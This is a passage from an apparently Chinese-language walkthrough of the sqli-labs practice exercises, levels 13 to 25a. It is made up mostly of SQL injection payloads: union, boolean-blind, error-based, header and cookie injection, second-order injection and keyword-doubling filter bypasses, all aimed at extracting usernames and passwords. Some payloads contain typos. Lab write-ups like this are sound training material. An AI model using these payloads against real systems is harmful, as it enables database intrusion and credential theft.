) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users#</span><br><span class="hljs-string">-1&quot; ) union select 1,group_concat(username ,id , password) from user#</span><br></code></pre></td></tr></table></figure><h2 id="13"><a href="#13" class="headerlink" title="13"></a>13</h2><p>写入1‘出现报错</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201126096.png" alt="image-20250304134416401"></p><p>使用  ‘）进行闭合</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">1</span>&#x27; )<span class="hljs-keyword">or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span><span class="hljs-meta">#</span><br><span class="hljs-number">1</span>&#x27; ) order by <span class="hljs-number">3</span><span class="hljs-meta">#</span><br><span class="hljs-number">-1</span>&#x27; ) <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span><span class="hljs-meta">#</span><br><span class="hljs-number">-1</span>&#x27; ) <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> ,version,<span class="hljs-built_in">database</span>(,version#<br><span class="hljs-number">-1</span>&#x27; ) <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">group_concat</span>(table_name) from information_schema.tables <span class="hljs-built_in">where</span> table_schema=&#x27;security<span class="hljs-meta">#</span><br><span class="hljs-number">-1</span>&#x27; ) <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">group_concat</span>(column_name) from information_schema.columns <span class="hljs-built_in">where</span> table_name=&#x27;users<span class="hljs-meta">#</span><br><span class="hljs-number">-1</span>&#x27; ) <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">group_concat</span>(username ,id , password) from user<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><h2 id="14"><a href="#14" class="headerlink" title="14"></a>14</h2><p>写入1”出现报错</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201129817.png" alt="image-20250304134458284"></p><p>只使用双引号</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span>&quot;or 1=1#<br>1&quot; <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">3</span>#<br><span class="hljs-number">-1</span>&quot; union select 1,2#<br>-1&quot; <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> ,<span class="hljs-keyword">version</span>,<span class="hljs-keyword">database</span>(,<span class="hljs-keyword">version</span>#<br><span class="hljs-number">-1</span>&quot; union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security#<br>-1&quot; <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users#</span><br><span class="hljs-string">-1&quot; union select 1,group_concat(username ,id , password) from user#</span><br></code></pre></td></tr></table></figure><h2 id="15-post布尔注入"><a href="#15-post布尔注入" class="headerlink" title="15(post布尔注入)"></a>15(post布尔注入)</h2><ul><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201138247.png" alt="image-20250304202410979"></p><p>1’ or 1&#x3D;1#</p><p>无反馈，使用布尔盲注</p><p>uname&#x3D;     相关代码   &amp;passwd&#x3D;&amp;submit&#x3D;Submit</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span>#(判断闭合符号)<br><span class="hljs-attribute">1</span>&#x27; or length(database())&gt;<span class="hljs-number">7</span>#（猜数据库长度）<br><span class="hljs-attribute">1</span>&#x27; or ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">114</span>#（猜数据库名字）<br><span class="hljs-attribute">1</span>&#x27; or length((select table_name from information_schema.tables where table_schema=database() limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">5</span>#（猜表名长度）<br><span class="hljs-attribute">1</span>&#x27; or ascii(substr((select table_name from information_schema.tables where table_schema=database() limit <span class="hljs-number">3</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">116</span>#（猜表名名字）<br><span class="hljs-attribute">1</span>&#x27; or (length((select column_name from information_schema.columns where table_schema=database() and table_name=<span class="hljs-string">&quot;users&quot;</span>limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)))&gt;<span class="hljs-number">1</span>#（猜列名长度）<br><span class="hljs-attribute">1</span>&#x27; or ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=<span class="hljs-string">&quot;users&quot;</span> limit <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">116</span>#（猜列名名字）<br><span class="hljs-attribute">1</span>&#x27; or length((select password from users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">3</span>#（猜数据长度）<br><span class="hljs-attribute">1</span>&#x27; or ascii(substr((select password from users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">67</span>#（猜数据名字）<br><br></code></pre></td></tr></table></figure></li></ul><h2 id="16"><a href="#16" class="headerlink" title="16"></a>16</h2><ul><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201140608.png" alt="image-20250304212902595"></p><p><strong>双引号+括号</strong>进行闭合</p></li><li><p>uname&#x3D;     相关代码        &amp;passwd&#x3D;&amp;submit&#x3D;Submit</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span>&quot;) or 1=1#(判断闭合符号)<br>1&quot;) <span class="hljs-keyword">or</span> length(<span class="hljs-keyword">database</span>())&gt;<span class="hljs-number">7</span>#（猜数据库长度）<br><span class="hljs-number">1</span>&quot;) or ascii(substr(database(),1,1))&gt;114#（猜数据库名字）<br>1&quot;) <span class="hljs-keyword">or</span> length((<span class="hljs-keyword">select</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">5</span>#（猜表名长度）<br><span class="hljs-number">1</span>&quot;) or ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),1,1))&gt;116#（猜表名名字）<br>1&quot;) <span class="hljs-keyword">or</span> (length((<span class="hljs-keyword">select</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span>=&quot;users&quot;<span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)))&gt;<span class="hljs-number">1</span>#（猜列名长度）<br><span class="hljs-number">1</span>&quot;) or ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&quot;users&quot; limit 1,1),1,1))&gt;116#（猜列名名字）<br>1&quot;) <span class="hljs-keyword">or</span> length((<span class="hljs-keyword">select</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">3</span>#（猜数据长度）<br><span class="hljs-number">1</span>&quot;) or ascii(substr((select password from users limit 0,1),1,1))&gt;67#（猜数据名字）<br></code></pre></td></tr></table></figure></li></ul><h2 id="17"><a href="#17" class="headerlink" title="17"></a>17</h2><ul><li><p>题目提示修改密码<br>抓包之后还是post型</p><p>所以使用passd进行测试</p></li><li><p>根据源代码</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201143027.png" alt="image-20250304220832488"></p><p>表明：uname只能是<strong>库名</strong></p><p>​使用passd注入</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201144214.png" alt="image-20250304220949627"></p><p>uname&#x3D;admin</p><p>passd&#x3D;1’  出现报错</p><p>使用报错注入</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201145243.png" alt="image-20250304221231893"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">uname</span>=admin<br><br><span class="hljs-attribute">1</span>&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span>#<br><span class="hljs-attribute">1</span>&#x27; and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(SELECT database()),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>)#<br><span class="hljs-attribute">1</span>&#x27; and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select distinct concat(<span class="hljs-number">0</span>x7e, (select  group_concat(table_name)),<span class="hljs-number">0</span>x7e) from information_schema.tables where table_schema=&#x27;security&#x27;),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>) #<br><span class="hljs-attribute">1</span>&#x27;and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select distinct concat(<span class="hljs-number">0</span>x7e, (select group_concat(column_name)),<span class="hljs-number">0</span>x7e) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>)#<br><span class="hljs-attribute">1</span>&#x27;and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select distinct concat(<span class="hljs-number">0</span>x7e, (select group_concat(username,id,password)),<span class="hljs-number">0</span>x7e) from users ),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>)#<br></code></pre></td></tr></table></figure></li></ul><h2 id="18"><a href="#18" class="headerlink" title="18"></a>18</h2><ul><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201146678.png" alt="image-20250305185702069"></p><p>提示user agent</p><p><img src="C:\Users\95227\AppData\Roaming\Typora\typora-user-images\image-20250305185740234.png" alt="image-20250305185740234"></p><p>源代码将uname&amp;passwd都使用check_input函数</p></li><li><p>注入ua</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201148030.png" alt="image-20250305190437037"></p><p>提示闭合 为单引号</p></li><li><p>报错注入</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select database())),<span class="hljs-number">1</span>) and &#x27;<span class="hljs-number">1</span>&#x27; =&#x27;<span class="hljs-number">1</span>#<br> <br><span class="hljs-attribute">1</span>&#x27; and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select distinct concat(<span class="hljs-number">0</span>x7e, (select  group_concat(table_name)),<span class="hljs-number">0</span>x7e) from information_schema.tables where table_schema=&#x27;security&#x27;),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>) and &#x27;<span class="hljs-number">1</span>&#x27; =&#x27;<span class="hljs-number">1</span>#<br><br><span class="hljs-attribute">1</span>&#x27;and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select distinct concat(<span class="hljs-number">0</span>x7e, (select group_concat(column_name)),<span class="hljs-number">0</span>x7e) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>) and &#x27;<span class="hljs-number">1</span>&#x27; =&#x27;<span class="hljs-number">1</span>#<br><br><span class="hljs-attribute">1</span>&#x27;and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select distinct concat(<span class="hljs-number">0</span>x7e, (select group_concat(username,id,password)),<span class="hljs-number">0</span>x7e) from users ),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>) and &#x27;<span class="hljs-number">1</span>&#x27; =&#x27;<span class="hljs-number">1</span>#<br></code></pre></td></tr></table></figure></li></ul><h2 id="19"><a href="#19" class="headerlink" title="19"></a>19</h2><ul><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201149812.png" alt="image-20250305194359527"></p><p>提示referer</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select database())),<span class="hljs-number">1</span>) and &#x27;<span class="hljs-number">1</span>&#x27; =&#x27;<span class="hljs-number">1</span>#<br> <br><span class="hljs-attribute">1</span>&#x27; and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select distinct concat(<span class="hljs-number">0</span>x7e, (select  group_concat(table_name)),<span class="hljs-number">0</span>x7e) from information_schema.tables where table_schema=&#x27;security&#x27;),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>) and &#x27;<span class="hljs-number">1</span>&#x27; =&#x27;<span class="hljs-number">1</span>#<br><br><span class="hljs-attribute">1</span>&#x27;and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select distinct concat(<span class="hljs-number">0</span>x7e, (select group_concat(column_name)),<span class="hljs-number">0</span>x7e) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>) and &#x27;<span class="hljs-number">1</span>&#x27; =&#x27;<span class="hljs-number">1</span>#<br><br><span class="hljs-attribute">1</span>&#x27;and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select distinct concat(<span class="hljs-number">0</span>x7e, (select group_concat(username,id,password)),<span class="hljs-number">0</span>x7e) from users ),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>) and &#x27;<span class="hljs-number">1</span>&#x27; =&#x27;<span class="hljs-number">1</span>#<br></code></pre></td></tr></table></figure></li></ul><h2 id="20（cookie）"><a href="#20（cookie）" class="headerlink" title="20（cookie）"></a>20（cookie）</h2><ul><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201151227.png" alt="image-20250305194725524"></p><p>出现cookie</p></li><li><p>登录后在刷新抓包</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201156027.png" alt="image-20250305195520723"></p><p>测试单引号闭合</p><p>使用<strong>联合注入或者报错注入</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">uname</span>=admin&#x27; <span class="hljs-number">1</span>&#x27; and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select database())),<span class="hljs-number">1</span>) and &#x27;<span class="hljs-number">1</span>&#x27; =&#x27;<span class="hljs-number">1</span>#<br> <br><span class="hljs-attribute">uname</span>=admin&#x27;<span class="hljs-number">1</span>&#x27; and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select distinct concat(<span class="hljs-number">0</span>x7e, (select  group_concat(table_name)),<span class="hljs-number">0</span>x7e) from information_schema.tables where table_schema=&#x27;security&#x27;),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>) and &#x27;<span class="hljs-number">1</span>&#x27; =&#x27;<span class="hljs-number">1</span>#<br><br><span class="hljs-attribute">uname</span>=admin&#x27;<span class="hljs-number">1</span>&#x27;and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select distinct concat(<span class="hljs-number">0</span>x7e, (select group_concat(column_name)),<span class="hljs-number">0</span>x7e) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>) and &#x27;<span class="hljs-number">1</span>&#x27; =&#x27;<span class="hljs-number">1</span>#<br><br><span class="hljs-attribute">uname</span>=admin&#x27;<span class="hljs-number">1</span>&#x27;and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select distinct concat(<span class="hljs-number">0</span>x7e, (select group_concat(username,id,password)),<span class="hljs-number">0</span>x7e) from users ),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>) and &#x27;<span class="hljs-number">1</span>&#x27; =&#x27;<span class="hljs-number">1</span>#<br></code></pre></td></tr></table></figure></li></ul><h2 id="21（cookie-base64）"><a href="#21（cookie-base64）" class="headerlink" title="21（cookie+base64）"></a>21（cookie+base64）</h2><ul><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201158713.png" alt="image-20250305200559293"></p><p>出现base64编码</p><p>闭合为单引号（‘）</p></li><li><p>解码后使用</p><p><strong>联合注入或者报错注入</strong></p></li></ul><h2 id="22"><a href="#22" class="headerlink" title="22"></a>22</h2><ul><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201158713.png" alt="image-20250305200559293"></p><p>出现base64编码</p><p>闭合为双引号（“）</p></li><li><p>解码后使用</p><p><strong>联合注入或者报错注入</strong></p></li></ul><h2 id="23（只联合）"><a href="#23（只联合）" class="headerlink" title="23（只联合）"></a>23（只联合）</h2><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201206189.png" alt="image-20250305202555964"></p><p>本题过滤了#和–（ 不能注释后面的字符）</p><p><strong>只能使用联合</strong></p><p><strong>因为只有联合使用OR ‘1’&#x3D;’1可以代替注释符</strong></p><p>但是使用报错注入的话，and ‘1’&#x3D;’1<strong>不能</strong>替代注释符</p><ul><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201208232.png" alt="image-20250305202437014"></p><p>为单引号闭合</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">id</span>=<span class="hljs-number">1</span>&#x27; or &#x27;<span class="hljs-number">1</span>&#x27; =&#x27;<span class="hljs-number">1</span><br><br><span class="hljs-attribute">id</span>=-<span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>, database(),version() or &#x27;<span class="hljs-number">1</span>&#x27; = &#x27;<span class="hljs-number">1</span><br><br><span class="hljs-attribute">id</span>=-<span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,(select group_concat(table_name) from information_schema.tables where table_schema=‘security&#x27;),<span class="hljs-number">3</span> or &#x27;<span class="hljs-number">1</span>&#x27;=&#x27;<span class="hljs-number">1</span><br><br><span class="hljs-attribute">id</span>=-<span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,(select group_concat(column_name) from information_schema.columns where table_schema=‘security&#x27; and table_name=‘users’ ),<span class="hljs-number">3</span> or &#x27;<span class="hljs-number">1</span>&#x27;=&#x27;<span class="hljs-number">1</span><br><br><span class="hljs-attribute">id</span>=-<span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,(select group_concat(password,“-”,username) from users),<span class="hljs-number">3</span> or &#x27;<span class="hljs-number">1</span>&#x27;=&#x27;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure></li></ul><h2 id="24-二次注入"><a href="#24-二次注入" class="headerlink" title="24(二次注入)"></a>24(二次注入)</h2><ul><li><p>注册</p><p>账号admin’ #</p><p>密码111</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201210310.png"></p><p>再登录账号</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201211474.png" alt="image-20250305205830652"></p><p>修改密码</p><p>111 222 222</p><p>但是此时的admin’ #密码并没有修改（因为账户为admin‘ # <strong>屏蔽了后面的密码修改代码</strong>）</p><p>所以成功绕过</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201212847.png" alt="image-20250305210131665"></p><p>可以登入数据库</p></li></ul><h2 id="25（双写）"><a href="#25（双写）" class="headerlink" title="25（双写）"></a>25（双写）</h2><ul><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201213782.png" alt="image-20250305210241340"></p><p>注释了or和and</p><p>限制了联合和报错的order by   |  and  xxxx</p><p>重复注入（oorr      anandd）只过滤一个</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&#x27;<br><br>?<span class="hljs-attribute">id</span>=1&#x27; anandd updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) --+<br><br>?<span class="hljs-attribute">id</span>=1&#x27; anandd updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select  group_concat(table_name)),0x7e) <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=<span class="hljs-string">&#x27;security&#x27;</span>),0x7e),1) --+ <br><br>?<span class="hljs-attribute">id</span>=1&#x27;anandd updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select group_concat(column_name)),0x7e) <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_schema</span>=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>),0x7e),1) --+<br><br>?<span class="hljs-attribute">id</span>=1&#x27;anandd updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select group_concat(username,id,password)),0x7e) <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>),0x7e),1) --+<br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&#x27; oorrder by 3<br>?<span class="hljs-attribute">id</span>=-1&#x27; union select 1,2,3<br>?<span class="hljs-attribute">id</span>=-1&#x27; union select 1,database(),version()<br>?<span class="hljs-attribute">id</span>=-1&#x27; union select 1,2,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=<span class="hljs-string">&#x27;security&#x27;</span><br>?<span class="hljs-attribute">id</span>=-1&#x27; union select 1,2,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span><br>?<span class="hljs-attribute">id</span>=-1&#x27; union select 1,2,group_concat(username ,id , password) <span class="hljs-keyword">from</span> users<br></code></pre></td></tr></table></figure></li></ul><h2 id="25a"><a href="#25a" class="headerlink" title="25a"></a>25a</h2><ul><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201219296.png" alt="image-20250306190129999"></p><p>无反馈，为数字注入</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?id=<span class="hljs-number">1</span><br><br>?id=<span class="hljs-number">1</span> anandd updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">database</span>()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">--+</span><br><br>?id=<span class="hljs-number">1</span> anandd updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">distinct</span> concat(<span class="hljs-number">0x7e</span>, (<span class="hljs-keyword">select</span>  group_concat(<span class="hljs-built_in">table_name</span>)),<span class="hljs-number">0x7e</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">--+ </span><br><br>?id=<span class="hljs-number">1</span>anandd updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">distinct</span> concat(<span class="hljs-number">0x7e</span>, (<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>)),<span class="hljs-number">0x7e</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">--+</span><br><br>?id=<span class="hljs-number">1</span>anandd updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">distinct</span> concat(<span class="hljs-number">0x7e</span>, (<span class="hljs-keyword">select</span> group_concat(username,id,<span class="hljs-keyword">password</span>)),<span class="hljs-number">0x7e</span>) <span class="hljs-keyword">from</span> users ),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">--+</span><br><br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?id=<span class="hljs-number">1</span> oorrder <span class="hljs-keyword">by</span> <span class="hljs-number">3</span><br>?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><br>?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">database</span>(),version()<br>?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span><br>?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span 